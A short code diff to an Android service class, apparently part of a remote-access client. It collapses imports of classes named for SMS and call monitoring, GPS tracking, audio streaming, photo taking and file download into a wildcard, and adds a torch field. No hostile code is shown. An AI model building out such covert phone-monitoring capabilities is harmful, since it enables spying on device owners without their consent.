@@ -3,17 +3,7 @@ package my.app.client;
 import java.util.ArrayList;
 import java.util.HashSet;
 
-import my.app.Library.AdvancedSystemInfo;
-import my.app.Library.AudioStreamer;
-import my.app.Library.CallLogLister;
-import my.app.Library.CallMonitor;
-import my.app.Library.DirLister;
-import my.app.Library.FileDownloader;
-import my.app.Library.GPSListener;
-import my.app.Library.PhotoTaker;
-import my.app.Library.SMSLister;
-import my.app.Library.SMSMonitor;
-import my.app.Library.SystemInfo;
+import my.app.Library.*;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -76,6 +66,7 @@ public abstract class ClientListener extends Service implements OnRecordPosition
 	public Toast toast ;
 	public SMSMonitor smsMonitor ;
 	public AdvancedSystemInfo advancedInfos;
+	public Torch torch;
 	
 	boolean waitTrigger;
 	/**
